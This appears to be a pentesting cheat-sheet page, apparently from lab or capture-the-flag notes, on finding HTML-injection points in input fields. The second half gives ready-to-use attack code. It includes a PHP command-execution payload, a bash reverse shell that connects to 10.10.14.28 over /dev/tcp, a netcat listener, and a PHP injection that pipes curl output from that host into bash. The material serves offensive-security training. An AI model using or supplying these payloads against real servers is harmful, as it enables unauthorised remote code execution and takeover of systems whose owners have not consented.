# HTML Injection



## HTML Injection Enumeration

### **Find Input Fields**

Input fields may be found in the following examples:

* Search boxes
* Comments
* Post
* Forms

**Try inserting special characters to see if they are not filtered:**

```text
< >; ' " { } ;
```

* &lt; &gt;; = denote elements in HTML
* ' " = denote strings on JavaScript
* {} = function declarations of JavaScript
* ; = end of a statement on JavaScript
* &lt;?php = PHP code
* ?&gt; = end of PHP code

**If these characters are not removed or encoded then the website might be vulnerable to XSS:**

* URL Encoding
* HTML Encoding

**Then we might be able to code since we can use these special characters!**

Test HTML tags in input fields:

```markup
<h1>Hola</h1>
<marquee>Hola</marquee>
```

Test malicious code in other languages \(e.g PHP\)

```php
<?php system("whoami"); ?>
```

## Reverse Shell via PHP Injection

Create an index.html file in your webroot directory that actually executes bash code:

```bash
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.28/443 0>&1
```

Set a listener on a port of your choosing:

```text
nc -lvnp 443
```

Inject a malicious PHP code:

```php
<?php system("curl 10.10.14.28 | bash"); ?>
```

